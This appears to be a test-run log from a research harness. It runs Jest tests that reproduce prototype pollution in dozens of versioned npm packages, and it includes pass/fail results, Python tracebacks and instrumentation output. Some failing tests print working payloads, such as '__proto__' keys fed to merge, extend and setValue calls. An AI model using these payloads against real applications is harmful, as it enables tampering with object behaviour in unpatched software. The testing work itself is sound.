  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['npx', 'jest', 'brikcss-merge_1.3.0/@brikcss-merge.test.js']' returned non-zero exit status 1.
['../prototype-pollution/mquery_3.2.1/mquery.test.js']
PASS mquery_3.2.1/mquery.test.js
  ✓ prototype pollution in mquery (1014 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        1.888 s
Ran all test suites matching /mquery_3.2.1\/mquery.test.js/i.
b"Loaded babel plugin\n  console.log\n    [\n      'permissions',\n      '_isPermitted',\n      'canMerge',\n      'setGlobalTraceFunction',\n      'utils',\n      'env',\n      'Collection',\n      'BaseCollection',\n      'Promise',\n      'main'\n    ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'main' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 1, 5\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/typeorm_0.2.24/TypeORM.test.js']
FAIL typeorm_0.2.24/TypeORM.test.js
  ✕ prototype pollution in typeORM (275 ms)

  ● prototype pollution in typeORM

    TypeError: pushFct(...) is not a function

      at node_modules/reflect-metadata/Reflect.js:19:5
      at Object.<anonymous> (node_modules/reflect-metadata/Reflect.js:16:1)
      at Object.<anonymous> (src/index.ts:3:1)
      at Object.<anonymous> (require-interception.js:28:27)

  ● prototype pollution in typeORM

    TypeError: Cannot read properties of undefined (reading 'size')

      46 |    console.log(global.accessedProperties);   
      47 |    let maxChain = getMaxLength(global.fctsLog) - 1;
    > 48 |    let percUsed = Math.floor(global.accessedProperties.size /global.declaredProperties.length * 10);
         |                                                        ^
      49 |    if (global.accessedProperties.size === 0) percUsed = -1;
      50 |    if (maxChain >= 10) maxChain = 9;
      51 |    if (percUsed === 10) percUsed = 9;

      at Object.<anonymous> (require-interception.js:48:56)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        1.146 s
Ran all test suites matching /typeorm_0.2.24\/TypeORM.test.js/i.
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/test_modules_in_serial.py", line 24, in <module>
    ping = subprocess.run(['npx','jest', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['npx', 'jest', 'typeorm_0.2.24/TypeORM.test.js']' returned non-zero exit status 1.
['../prototype-pollution/node-oojs_1.4.0/node-oojs.test.js']
PASS node-oojs_1.4.0/node-oojs.test.js
  ✓ prototype pollution in node-oojs (183 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        1.033 s
Ran all test suites matching /node-oojs_1.4.0\/node-oojs.test.js/i.
b'Loaded babel plugin\n  console.log\n    []\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(0) {}\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: -1, 5\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n'
['../prototype-pollution/nested-object-assign_1.0.3/nested-object-assign.test.js']
PASS nested-object-assign_1.0.3/nested-object-assign.test.js
  ✓ prototype pollution in nested-object-assign (76 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        0.931 s
Ran all test suites matching /nested-object-assign_1.0.3\/nested-object-assign.test.js/i.
b"Loaded babel plugin\n  console.log\n    [ 'main' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'main' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 9, 3\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/plain-object-merge_1.0.1/plain-object-merge.test.js']
FAIL plain-object-merge_1.0.1/plain-object-merge.test.js
  ✕ prototype pollution in plain-object-merge (69 ms)

  ● prototype pollution in plain-object-merge

    ReferenceError: obj is not defined

      4 |   const payload = JSON.parse('{"__proto__":{"polluted":"yes"}}');
      5 | 
    > 6 |   obj = {};
        |      ^
      7 | 
      8 |   expect({}.polluted).toBe(undefined);
      9 | 

      at Object.<anonymous> (plain-object-merge_1.0.1/plain-object-merge.test.js:6:6)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        0.951 s
Ran all test suites matching /plain-object-merge_1.0.1\/plain-object-merge.test.js/i.
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/test_modules_in_serial.py", line 24, in <module>
    ping = subprocess.run(['npx','jest', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['npx', 'jest', 'plain-object-merge_1.0.1/plain-object-merge.test.js']' returned non-zero exit status 1.
['../prototype-pollution/json-schema_0.3.0/json-schema.test.js']
PASS json-schema_0.3.0/json-schema.test.js
  ✓ prototype pollution in json-schema (93 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        0.958 s
Ran all test suites matching /json-schema_0.3.0\/json-schema.test.js/i.
b"Loaded babel plugin\n  console.log\n    [\n      'Integer',\n      'validate',\n      'checkPropertyChange',\n      '_validate',\n      'mustBeValid',\n      'main'\n    ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(2) { 'main', 'validate' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 3, 7\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/flat-wrap_1.0.2/flat-wrap.test.js']
PASS flat-wrap_1.0.2/flat-wrap.test.js
  ✓ prototype pollution in flat-wrap (88 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        1.006 s
Ran all test suites matching /flat-wrap_1.0.2\/flat-wrap.test.js/i.
b"Loaded babel plugin\n  console.log\n    [ 'flatten', 'unflatten' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'unflatten' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 5, 3\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/changeset_0.1.0/changeset.test.js']
FAIL changeset_0.1.0/changeset.test.js
  ✕ prototype pollution in changeset (84 ms)

  ● prototype pollution in changeset

    TypeError: Cannot read properties of undefined (reading '_')

      26 |         if (fs.existsSync(prefixed))
      27 |             currMod = prefixed;
    > 28 |         let result = jest.requireActual(currMod);
         |                           ^
      29 |         global.accessedProperties = new Set();
      30 |         global.declaredProperties = Object.keys(result);    
      31 |         

      at call (node_modules/underscore/underscore.js:15:33)
      at Object.<anonymous> (node_modules/underscore/underscore.js:1226:4)
      at Object.<anonymous> (node_modules/changeset/index.js:1:9)
      at Object.<anonymous> (require-interception.js:28:27)

  ● prototype pollution in changeset

    TypeError: changeset.apply is not a function

       5 |   const changeset = require("changeset");
       6 |   const patch = [{ type: "put", key: ["__proto__", "polluted"], value: "yes" }];
    >  7 |   changeset.apply(patch, {}, true);
         |             ^
       8 | 
       9 |   expect({}.polluted).toBe("yes");
      10 | });

      at Object.<anonymous> (changeset_0.1.0/changeset.test.js:7:13)

  ● prototype pollution in changeset

    TypeError: Cannot read properties of undefined (reading 'size')

      46 |    console.log(global.accessedProperties);   
      47 |    let maxChain = getMaxLength(global.fctsLog) - 1;
    > 48 |    let percUsed = Math.floor(global.accessedProperties.size /global.declaredProperties.length * 10);
         |                                                        ^
      49 |    if (global.accessedProperties.size === 0) percUsed = -1;
      50 |    if (maxChain >= 10) maxChain = 9;
      51 |    if (percUsed === 10) percUsed = 9;

      at Object.<anonymous> (require-interception.js:48:56)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        0.978 s
Ran all test suites matching /changeset_0.1.0\/changeset.test.js/i.
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/test_modules_in_serial.py", line 24, in <module>
    ping = subprocess.run(['npx','jest', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['npx', 'jest', 'changeset_0.1.0/changeset.test.js']' returned non-zero exit status 1.
['../prototype-pollution/decal_2.1.3/decal.test.js']
FAIL decal_2.1.3/decal.test.js
  ✕ prototype pollution in decal (66 ms)

  ● prototype pollution in decal

    TypeError: /Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/node_modules/decal/src/core/Array.js: Cannot read properties of undefined (reading 'unshift')

      71 |           if (path.node.id) name = path.node.id.name;
      72 |           // console.log(path.node.body);
    > 73 |           path.node.body.body.unshift(
         |                               ^
      74 |             t.callExpression(t.identifier("pushFct"), [
      75 |               t.stringLiteral(name + ":" + path.node.loc.start.line),
      76 |             ])

      at PluginPass.enter (babel-instrumentor.js:73:31)
      at newFn (../node_modules/@babel/traverse/lib/visitors.js:177:21)
      at NodePath._call (../node_modules/@babel/traverse/lib/path/context.js:53:20)
      at NodePath.call (../node_modules/@babel/traverse/lib/path/context.js:40:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:100:31)
      at TraversalContext.visitQueue (../node_modules/@babel/traverse/lib/context.js:103:16)
      at TraversalContext.visitMultiple (../node_modules/@babel/traverse/lib/context.js:72:17)
      at TraversalContext.visit (../node_modules/@babel/traverse/lib/context.js:129:19)
      at traverseNode (../node_modules/@babel/traverse/lib/traverse-node.js:24:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:107:52)

  ● prototype pollution in decal

    TypeError: decal.extend is not a function

       6 | 
       7 |   const o = JSON.parse('{"__proto__":{"polluted":"yes"}}');
    >  8 |   decal.extend({}, true, o);
         |         ^
       9 | 
      10 |   expect({}.polluted).toBe("yes");
      11 | });

      at Object.<anonymous> (decal_2.1.3/decal.test.js:8:9)

  ● prototype pollution in decal

    TypeError: Cannot read properties of undefined (reading 'size')

      46 |    console.log(global.accessedProperties);   
      47 |    let maxChain = getMaxLength(global.fctsLog) - 1;
    > 48 |    let percUsed = Math.floor(global.accessedProperties.size /global.declaredProperties.length * 10);
         |                                                        ^
      49 |    if (global.accessedProperties.size === 0) percUsed = -1;
      50 |    if (maxChain >= 10) maxChain = 9;
      51 |    if (percUsed === 10) percUsed = 9;

      at Object.<anonymous> (require-interception.js:48:56)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        0.937 s
Ran all test suites matching /decal_2.1.3\/decal.test.js/i.
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/test_modules_in_serial.py", line 24, in <module>
    ping = subprocess.run(['npx','jest', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['npx', 'jest', 'decal_2.1.3/decal.test.js']' returned non-zero exit status 1.
['../prototype-pollution/viking04-merge_1.0.0/@viking04-merge.test.js']
FAIL viking04-merge_1.0.0/@viking04-merge.test.js
  ✕ prototype pollution in config-handler (35 ms)

  ● prototype pollution in config-handler

    ReferenceError: src is not defined

       6 |   let a = {};
       7 |   var prototype_pollution_test = JSON.parse('{"__proto__":{"polluted":"yes"}}');
    >  8 |   merge(a, prototype_pollution_test);
         |   ^
       9 | 
      10 |   expect({}.polluted).toBe("yes");
      11 | });

      at merge (node_modules/@viking04/merge/index.js:2:10)
      at Object.<anonymous> (viking04-merge_1.0.0/@viking04-merge.test.js:8:3)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        0.91 s
Ran all test suites matching /viking04-merge_1.0.0\/@viking04-merge.test.js/i.
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/test_modules_in_serial.py", line 24, in <module>
    ping = subprocess.run(['npx','jest', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['npx', 'jest', 'viking04-merge_1.0.0/@viking04-merge.test.js']' returned non-zero exit status 1.
['../prototype-pollution/mpath_0.4.1/mpath.test.js']
PASS mpath_0.4.1/mpath.test.js
  ✓ prototype pollution in mpath  (125 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        1.077 s
Ran all test suites matching /mpath_0.4.1\/mpath.test.js/i.
b"Loaded babel plugin\n  console.log\n    [ 'get', 'has', 'unset', 'set' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'set' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 2, 2\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/nodee-utils_1.2.2/nodee-utils.test.js']
FAIL nodee-utils_1.2.2/nodee-utils.test.js
  ✕ prototype pollution in nodee-utils (651 ms)

  ● prototype pollution in nodee-utils

    TypeError: /Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/node_modules/nodee-utils/node_modules/superagent/lib/node/index.js: Cannot read properties of undefined (reading 'unshift')

      71 |           if (path.node.id) name = path.node.id.name;
      72 |           // console.log(path.node.body);
    > 73 |           path.node.body.body.unshift(
         |                               ^
      74 |             t.callExpression(t.identifier("pushFct"), [
      75 |               t.stringLiteral(name + ":" + path.node.loc.start.line),
      76 |             ])

      at PluginPass.enter (babel-instrumentor.js:73:31)
      at newFn (../node_modules/@babel/traverse/lib/visitors.js:177:21)
      at NodePath._call (../node_modules/@babel/traverse/lib/path/context.js:53:20)
      at NodePath.call (../node_modules/@babel/traverse/lib/path/context.js:40:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:100:31)
      at TraversalContext.visitQueue (../node_modules/@babel/traverse/lib/context.js:103:16)
      at TraversalContext.visitSingle (../node_modules/@babel/traverse/lib/context.js:77:19)
      at TraversalContext.visit (../node_modules/@babel/traverse/lib/context.js:131:19)
      at traverseNode (../node_modules/@babel/traverse/lib/traverse-node.js:24:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:107:52)

  ● prototype pollution in nodee-utils

    TypeError: Cannot read properties of undefined (reading 'size')

      46 |    console.log(global.accessedProperties);   
      47 |    let maxChain = getMaxLength(global.fctsLog) - 1;
    > 48 |    let percUsed = Math.floor(global.accessedProperties.size /global.declaredProperties.length * 10);
         |                                                        ^
      49 |    if (global.accessedProperties.size === 0) percUsed = -1;
      50 |    if (maxChain >= 10) maxChain = 9;
      51 |    if (percUsed === 10) percUsed = 9;

      at Object.<anonymous> (require-interception.js:48:56)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        1.708 s
Ran all test suites matching /nodee-utils_1.2.2\/nodee-utils.test.js/i.
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/test_modules_in_serial.py", line 24, in <module>
    ping = subprocess.run(['npx','jest', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['npx', 'jest', 'nodee-utils_1.2.2/nodee-utils.test.js']' returned non-zero exit status 1.
['../prototype-pollution/eivifj-dot_1.0.2/eivifj-dot.test.js']
PASS eivifj-dot_1.0.2/eivifj-dot.test.js
  ✓ prototype pollution in @eivifj/dot (50 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        1.27 s
Ran all test suites matching /eivifj-dot_1.0.2\/eivifj-dot.test.js/i.
b"Loaded babel plugin\n  console.log\n    [ 'set', 'get', 'delete' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'set' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 3, 1\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/i18next_19.7.0/i18next.test.js']
PASS i18next_19.7.0/i18next.test.js
  ✓ prototype pollution in i18next  (508 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        1.856 s
Ran all test suites matching /i18next_19.7.0\/i18next.test.js/i.
b"Loaded babel plugin\n  console.log\n    [ 'observers', 'options', 'services', 'logger', 'modules' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(0) {}\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: -1, 3\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/shvl_2.0.1/shvl.test.js']
FAIL shvl_2.0.1/shvl.test.js
  ✕ prototype pollution in shvl (55 ms)

  ● prototype pollution in shvl

    ReferenceError: obj is not defined

      3 | test("prototype pollution in shvl", () => {
      4 |   var shvl = require("shvl");
    > 5 |   obj = {};
        |      ^
      6 | 
      7 |   expect({}.polluted).toBe(undefined);
      8 | 

      at Object.<anonymous> (shvl_2.0.1/shvl.test.js:5:6)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        1.039 s
Ran all test suites matching /shvl_2.0.1\/shvl.test.js/i.
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/test_modules_in_serial.py", line 24, in <module>
    ping = subprocess.run(['npx','jest', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['npx', 'jest', 'shvl_2.0.1/shvl.test.js']' returned non-zero exit status 1.
['../prototype-pollution/object-path-set_1.0.0/object-path-set.test.js']
PASS object-path-set_1.0.0/object-path-set.test.js
  ✓ prototype pollution in object-path-set  (31 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        1.225 s
Ran all test suites matching /object-path-set_1.0.0\/object-path-set.test.js/i.
b"Loaded babel plugin\n  console.log\n    [ 'main' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'main' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 9, 2\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/madlib-object-utils_0.1.6/madlib-object-utils.test.js']
FAIL madlib-object-utils_0.1.6/madlib-object-utils.test.js
  ✕ prototype pollution in madlib-object-utils (55 ms)

  ● prototype pollution in madlib-object-utils

    TypeError: pushFct(...) is not a function

      26 |         if (fs.existsSync(prefixed))
      27 |             currMod = prefixed;
    > 28 |         let result = jest.requireActual(currMod);
         |                           ^
      29 |         global.accessedProperties = new Set();
      30 |         global.declaredProperties = Object.keys(result);    
      31 |         

      at call (node_modules/madlib-object-utils/lib/utils.js:2:3)
      at Object.<anonymous> (node_modules/madlib-object-utils/lib/utils.js:135:4)
      at Object.<anonymous> (require-interception.js:28:27)

  ● prototype pollution in madlib-object-utils

    TypeError: objectUtils.setValue is not a function

      4 | 
      5 |   const objectUtils = require("madlib-object-utils");
    > 6 |   objectUtils.setValue("__proto__.polluted", {}, "yes");
        |               ^
      7 | 
      8 |   expect({}.polluted).toBe("yes");
      9 | });

      at Object.<anonymous> (madlib-object-utils_0.1.6/madlib-object-utils.test.js:6:15)

  ● prototype pollution in madlib-object-utils

    TypeError: Cannot read properties of undefined (reading 'size')

      46 |    console.log(global.accessedProperties);   
      47 |    let maxChain = getMaxLength(global.fctsLog) - 1;
    > 48 |    let percUsed = Math.floor(global.accessedProperties.size /global.declaredProperties.length * 10);
         |                                                        ^
      49 |    if (global.accessedProperties.size === 0) percUsed = -1;
      50 |    if (maxChain >= 10) maxChain = 9;
      51 |    if (percUsed === 10) percUsed = 9;

      at Object.<anonymous> (require-interception.js:48:56)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        1.184 s
Ran all test suites matching /madlib-object-utils_0.1.6\/madlib-object-utils.test.js/i.
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/test_modules_in_serial.py", line 24, in <module>
    ping = subprocess.run(['npx','jest', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['npx', 'jest', 'madlib-object-utils_0.1.6/madlib-object-utils.test.js']' returned non-zero exit status 1.
['../prototype-pollution/lodash_4.17.10/lodash.test.js']
PASS lodash_4.17.10/lodash.test.js
  ✓ prototype pollution in lodash (1028 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        2.19 s
Ran all test suites matching /lodash_4.17.10\/lodash.test.js/i.
b"Loaded babel plugin\n  console.log\n    [\n      'templateSettings', 'after',          'ary',              'assign',\n      'assignIn',         'assignInWith',   'assignWith',       'at',\n      'before',           'bind',           'bindAll',          'bindKey',\n      'castArray',        'chain',          'chunk',            'compact',\n      'concat',           'cond',           'conforms',         'constant',\n      'countBy',          'create',         'curry',            'curryRight',\n      'debounce',         'defaults',       'defaultsDeep',     'defer',\n      'delay',            'difference',     'differenceBy',     'differenceWith',\n      'drop',             'dropRight',      'dropRightWhile',   'dropWhile',\n      'fill',             'filter',         'flatMap',          'flatMapDeep',\n      'flatMapDepth',     'flatten',        'flattenDeep',      'flattenDepth',\n      'flip',             'flow',           'flowRight',        'fromPairs',\n      'functions',        'functionsIn',    'groupBy',          'initial',\n      'intersection',     'intersectionBy', 'intersectionWith', 'invert',\n      'invertBy',         'invokeMap',      'iteratee',         'keyBy',\n      'keys',             'keysIn',         'map',              'mapKeys',\n      'mapValues',        'matches',        'matchesProperty',  'memoize',\n      'merge',            'mergeWith',      'method',           'methodOf',\n      'mixin',            'negate',         'nthArg',           'omit',\n      'omitBy',           'once',           'orderBy',          'over',\n      'overArgs',         'overEvery',      'overSome',         'partial',\n      'partialRight',     'partition',      'pick',             'pickBy',\n      'property',         'propertyOf',     'pull',             'pullAll',\n      'pullAllBy',        'pullAllWith',    'pullAt',           'range',\n      'rangeRight',       'rearg',          'reject',           'remove',\n      ... 209 more items\n    ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(2) { 'main', 'defaultsDeep' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 0, 9\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/copy-props_2.0.4/copy-props.test.js']
PASS copy-props_2.0.4/copy-props.test.js
  ✓ prototype pollution in copy-props (179 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        1.161 s
Ran all test suites matching /copy-props_2.0.4\/copy-props.test.js/i.
b"Loaded babel plugin\n  console.log\n    [ 'main' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'main' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 9, 9\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/set-deep-prop_1.0.0/set-deep-prop.test.js']
PASS set-deep-prop_1.0.0/set-deep-prop.test.js
  ✓ prototype pollution in safe-object2 (34 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        0.909 s
Ran all test suites matching /set-deep-prop_1.0.0\/set-deep-prop.test.js/i.
b"Loaded babel plugin\n  console.log\n    [ 'main' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'main' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 9, 1\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/fast-json-patch_2.0.4/fast-json-patch.test.js']
PASS fast-json-patch_2.0.4/fast-json-patch.test.js
  ✓ prototype pollution in fast-json-patch (496 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        1.482 s
Ran all test suites matching /fast-json-patch_2.0.4\/fast-json-patch.test.js/i.
b"Loaded babel plugin\n  console.log\n    [ 'isLegacyArguments' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'applyPatch' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 9, 3\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/think-helper_1.1.0/think-helper.test.js']
PASS think-helper_1.1.0/think-helper.test.js
  ✓ prototype pollution in think-helper (48 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        1.157 s
Ran all test suites matching /think-helper_1.1.0\/think-helper.test.js/i.
b"Loaded babel plugin\n  console.log\n    [\n      'isIP',               'isIPv4',            'isIPv6',\n      'isMaster',           'isArray',           'isBoolean',\n      'isNull',             'isNullOrUndefined', 'isNumber',\n      'isString',           'isSymbol',          'isUndefined',\n      'isRegExp',           'isObject',          'isDate',\n      'isError',            'isFunction',        'isPrimitive',\n      'isBuffer',           'isInt',             'promisify',\n      'extend',             'camelCase',         'snakeCase',\n      'isNumberString',     'isTrueEmpty',       'isEmpty',\n      'defer',              'md5',               'timeout',\n      'escapeHtml',         'datetime',          'uuid',\n      'parseAdapterConfig', 'ms',                'omit',\n      'isExist',            'isFile',            'isDirectory',\n      'chmod',              'mkdir',             'getdirFiles',\n      'rmdir'\n    ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'extend' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 0, 3\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/mixin-deep_2.0.0/mixin-deep.test.js']
PASS mixin-deep_2.0.0/mixin-deep.test.js
  ✓ prototype pollution in mixin-deep  (46 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        1.147 s
Ran all test suites matching /mixin-deep_2.0.0\/mixin-deep.test.js/i.
b"Loaded babel plugin\n  console.log\n    [ 'main' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'main' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 9, 7\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/grunt-util-property_0.0.2/grunt-util-property.test.js']
FAIL grunt-util-property_0.0.2/grunt-util-property.test.js
  ✕ prototype pollution in grunt-util-property (311 ms)

  ● prototype pollution in grunt-util-property

    TypeError: /Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/node_modules/async/dist/async.js: Cannot read properties of undefined (reading 'unshift')

      71 |           if (path.node.id) name = path.node.id.name;
      72 |           // console.log(path.node.body);
    > 73 |           path.node.body.body.unshift(
         |                               ^
      74 |             t.callExpression(t.identifier("pushFct"), [
      75 |               t.stringLiteral(name + ":" + path.node.loc.start.line),
      76 |             ])

      at PluginPass.enter (babel-instrumentor.js:73:31)
      at newFn (../node_modules/@babel/traverse/lib/visitors.js:177:21)
      at NodePath._call (../node_modules/@babel/traverse/lib/path/context.js:53:20)
      at NodePath.call (../node_modules/@babel/traverse/lib/path/context.js:40:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:100:31)
      at TraversalContext.visitQueue (../node_modules/@babel/traverse/lib/context.js:103:16)
      at TraversalContext.visitMultiple (../node_modules/@babel/traverse/lib/context.js:72:17)
      at TraversalContext.visit (../node_modules/@babel/traverse/lib/context.js:129:19)
      at traverseNode (../node_modules/@babel/traverse/lib/traverse-node.js:24:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:107:52)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        1.437 s
Ran all test suites matching /grunt-util-property_0.0.2\/grunt-util-property.test.js/i.
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/test_modules_in_serial.py", line 24, in <module>
    ping = subprocess.run(['npx','jest', test_file_name], stdout=subprocess.PIPE, check=True)
